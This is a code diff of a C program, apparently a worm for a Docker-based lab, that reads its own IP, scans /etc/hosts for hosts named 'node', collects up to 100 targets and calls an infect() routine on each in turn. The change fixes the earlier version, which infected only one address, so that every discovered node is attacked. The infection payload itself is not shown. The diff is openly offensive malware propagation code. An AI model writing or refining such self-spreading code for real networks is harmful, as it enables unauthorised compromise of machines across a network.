@@ -150,8 +150,10 @@ int main()
 {
     FILE *fp;
     char line[128];
-    char ip[MAX_IP_LEN];
+    char ip_array[100][MAX_IP_LEN];  /* Array to store up to 100 IPs */
     char my_ip[MAX_IP_LEN];
+    int num_targets = 0;
+    int i;
 
     strcpy(my_ip, "127.0.0.1");
     fp = fopen("/etc/docker_ip", "r");
@@ -163,40 +165,53 @@ int main()
     }
     printf("[*] Attacker IP is %s. Scanning for targets.\n", my_ip);
 
-    while (1) {
-        fp = fopen(HOSTS_FILE, "r");
-        if (fp == (FILE *)0) {
-            sleep(25);
+    /* Parse /etc/hosts once and collect all node IPs */
+    fp = fopen(HOSTS_FILE, "r");
+    if (fp == (FILE *)0) {
+        printf("[-] Could not open %s\n", HOSTS_FILE);
+        return 1;
+    }
+
+    while (fgets(line, 128, fp) != (char *)0) {
+        char current_hostname[64];
+        char current_ip[MAX_IP_LEN];
+
+        if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
             continue;
         }
 
-        while (fgets(line, 128, fp) != (char *)0) {
-            char current_hostname[64];
-
-            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
-                continue;
-            }
-
-            if (sscanf(line, "%s %s", ip, current_hostname) != 2) {
-                continue;
-            }
-
-            if (strcmp(ip, my_ip) == 0) {
-                continue;
-            }
-
-            /* Check if the first 4 characters of the hostname are "node" */
-            if (strncmp(current_hostname, "node", 4) == 0) {
-                
-                /* SUCCESS: 'ip' now holds the address of a node. */
-                 printf("[*] IP for %s found: %s\n", current_hostname, ip);
-            }
+        if (sscanf(line, "%s %s", current_ip, current_hostname) != 2) {
+            continue;
         }
 
-        infect(ip);
-        printf(" ---- Infection Complete for IP: %s ----\n", ip);
-        sleep(10);
-        
-        fclose(fp);
+        if (strcmp(current_ip, my_ip) == 0) {
+            continue;
+        }
+
+        /* Check if the first 4 characters of the hostname are "node" */
+        if (strncmp(current_hostname, "node", 4) == 0) {
+            printf("[*] IP for %s found: %s\n", current_hostname, current_ip);
+            
+            /* Store IP in array */
+            if (num_targets < 100) {
+                strcpy(ip_array[num_targets], current_ip);
+                num_targets++;
+            }
+        }
     }
+
+    fclose(fp);
+
+    printf("[*] Found %d target nodes. Starting infection sequence.\n", num_targets);
+
+    /* Infect each target in the array */
+    for (i = 0; i < num_targets; i++) {
+        printf("\n[*] Infecting target %d of %d: %s\n", i + 1, num_targets, ip_array[i]);
+        infect(ip_array[i]);
+        printf(" ---- Infection Complete for IP: %s ----\n", ip_array[i]);
+        sleep(10);
+    }
+
+    printf("[*] Infection sequence complete. All targets processed.\n");
+    return 0;
 }
